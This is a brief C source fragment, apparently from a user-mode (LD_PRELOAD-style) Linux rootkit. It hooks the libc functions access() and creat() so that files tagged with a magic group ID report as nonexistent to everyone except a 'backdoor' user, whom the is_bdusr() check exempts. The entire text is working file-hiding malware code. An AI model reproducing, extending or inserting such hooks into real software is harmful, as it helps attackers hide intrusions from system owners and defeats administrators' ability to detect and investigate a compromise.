int access(const char *pathname, int amode)
{
    HOOK(o_access, CACCESS);
    if(is_bdusr()) return o_access(pathname, amode);
    if(hxstat(pathname,MGID,32)) { errno=ENOENT; return -1; }
    return o_access(pathname, amode);
}

int creat(const char *pathname, mode_t mode)
{
    HOOK(o_creat,CCREAT);
    if(is_bdusr()) return o_creat(pathname, mode);
    if(hxstat(pathname,MGID,32)) { errno=ENOENT; return -1; }
    return o_creat(pathname,mode);
}
